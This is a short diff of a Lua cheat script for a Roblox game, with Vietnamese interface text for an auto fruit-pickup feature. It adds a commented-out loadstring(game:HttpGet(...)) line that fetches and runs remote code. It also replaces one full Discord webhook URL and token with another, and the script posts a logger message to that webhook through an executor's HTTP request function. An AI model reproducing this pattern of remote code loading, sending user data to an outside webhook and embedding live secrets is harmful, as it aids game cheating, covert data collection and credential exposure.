@@ -1,3 +1,4 @@
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/Phatdepzaicrystal/Script/refs/heads/main/Fruit.lua""))()
 function PostWebhook(Url, message)
     local request = http_request or request or HttpPost or syn.request
     local data =
@@ -40,7 +41,7 @@ function AdminLoggerMsg()
     return AdminMessage
 end
 
-PostWebhook("https://discord.com/api/webhooks/1317855877440733204/gDWyVlP_5BR51d7oO1pJVFHPbBjr2knUvEeGGjZ75UWkMQ4S4G0J4m6tHqmS1poBuev3", AdminLoggerMsg())
+PostWebhook("https://discord.com/api/webhooks/1325098343872860170/M-Ys30o1UzsFwlWJDLMq8wyQtT4Wa1Pcmrxgf_nzz1hS4HTJknxYyymJzQD-2WQRxwqO", AdminLoggerMsg())
 -- Thông Báo 
 require(game.ReplicatedStorage:WaitForChild("Notification")).new(
             " <Color=Green>Turbo Lite — Auto Nhặt Trái<Color=/> "
